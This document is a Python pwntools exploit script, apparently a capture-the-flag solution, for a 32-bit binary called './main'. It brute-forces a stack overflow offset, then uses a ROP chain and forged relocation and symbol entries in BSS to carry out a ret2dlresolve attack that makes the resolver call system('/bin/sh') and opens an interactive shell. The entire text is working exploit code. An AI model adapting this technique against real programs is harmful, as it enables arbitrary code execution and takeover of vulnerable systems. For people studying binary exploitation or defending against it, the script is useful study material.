from pwn import *


elf = context.binary = ELF('./main')
p = process()

PLT0 = elf.get_section_by_name(".plt")["sh_addr"]
STRTAB, SYMTAB, JMPREL = map(elf.dynamic_value_by_tag,["DT_STRTAB", "DT_SYMTAB", "DT_JMPREL"])
BSS = 0x804c034 # &buffer_size + 0x4 so we don't override it
putchar_address = 0x8049329
offset = 0

p.recvuntil(b'>')
i = 1
while True:
    offset = i * 0x4
    i = i + 1
    payload = b'A' * offset + p32(putchar_address)
    p.send(payload)
    data = p.recv(timeout=0.5)
    if data == b'>':
        break

log.info("offset: " + str(offset))

payload = flat({
  offset: [
    elf.sym.read,
    elf.sym.vuln,         # After the read call, return to vuln
    0,                    # stdin
    BSS,                  # place to write forge .rel.plt and .dynsym
    0x100,                # enough read size
  ]
})
p.send(payload)

# forge area in BSS section
dynsym_idx = ((BSS + (0x4*3)) - SYMTAB) // 0x10
r_info = (dynsym_idx << 8) | 0x7

# offset from the start of dynstr section 
# to our dynstr entry
dynstr_offset = (BSS + (0x4*7)) - STRTAB

payload = flat({
  0: [
    # .rel.plt
    elf.got.sleep,  # r_offset
    r_info,         # r_info
    0,              # r_addend

    # .dynsym
    dynstr_offset,  # st_name
    p32(0)*3,       # other

    b'system\x00\x00',

    b'/bin/sh\x00',
  ]
})
p.clean()
p.send(payload)

# call PLT0 (resolver) = system('/bin/sh')
binsh_addr = BSS + 12 + 16 + 8
# .rel.plt offset
rel_plt_offset = BSS - JMPREL

payload = flat({
  offset:[
    PLT0,           # calling the functions for resolving
    rel_plt_offset, # .rel.plt offset
    0xdeadbeef,     # The return address after resolving
    binsh_addr,     # argument
  ]
})

p.send(payload)
p.interactive()